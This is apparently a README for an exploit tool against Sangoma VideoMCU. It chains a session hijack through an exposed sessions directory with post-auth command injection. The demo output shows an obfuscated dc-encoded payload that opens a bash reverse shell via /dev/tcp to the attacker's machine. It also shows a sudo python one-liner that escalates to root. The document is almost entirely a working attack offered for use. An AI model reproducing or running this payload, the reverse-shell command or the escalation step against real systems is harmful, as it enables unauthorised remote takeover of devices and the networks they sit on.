# sangoma-videomcu-hijack-rce
Sangoma VideoMCU Session Hijack + Post-Auth RCE Chain.

Uses a dir listing to get a session hijack and then chains with a previous post-auth RCE.

Demo:
```
(venv) darren@Darrens-MacBook-Pro sangomas % python3 videomcu-hijacker-rce.py http://192.168.0.210 192.168.0.55 4001 
/Users/darren/projects/sangomas/videomcu-hijacker-rce.py:3: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  import telnetlib
[*] Using 192.168.0.55:4001 for connectback...
[+] starting handler on port 4001
[+] Attempting to list the sessions directory...
[*] Found some sessions...
[*] Got 7 sessions to try...
[+] Attempting to log into VideoMCU...
[-] Invalid, next...
[+] Attempting to log into VideoMCU...
[-] Invalid, next...
[+] Attempting to log into VideoMCU...
[-] Invalid, next...
[+] Attempting to log into VideoMCU...
[-] Invalid, next...
[+] Attempting to log into VideoMCU...
[-] Invalid, next...
[+] Attempting to log into VideoMCU...
[*] Logged in?
[+] Got what looks to be a valid session...
[+] Well, we made it this far...
63359877f7a85622272ebb92a9dc3fc7
[*] We made it this far and seem to have a valid session...
echo '16i 6E6F6875702062617368202D63202762617368202D69203E26202F6465762F7463702F3139322E3136382E302E35352F3430303120303E2631202627 P' | dc | sh
[+] Doing the command injection...
[*] Got connection from 192.168.0.210
[$] Shell popped :P
bash: no job control in this shell
bash-3.2$ id;uname -a;pwd
id;uname -a;pwd
uid=101(webconfig) gid=102(webconfig) groups=102(webconfig)
Linux videomcu 2.6.39-4.sng2 #1 SMP Wed Dec 21 17:26:48 EST 2011 i686 i686 i386 GNU/Linux
/var/webconfig/htdocs/admin
bash-3.2$ sudo /usr/local/videomcu/bin/python2.7 -c "import os;os.system('sh')"
sudo /usr/local/videomcu/bin/python2.7 -c "import os;os.system('sh')"

id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)


```
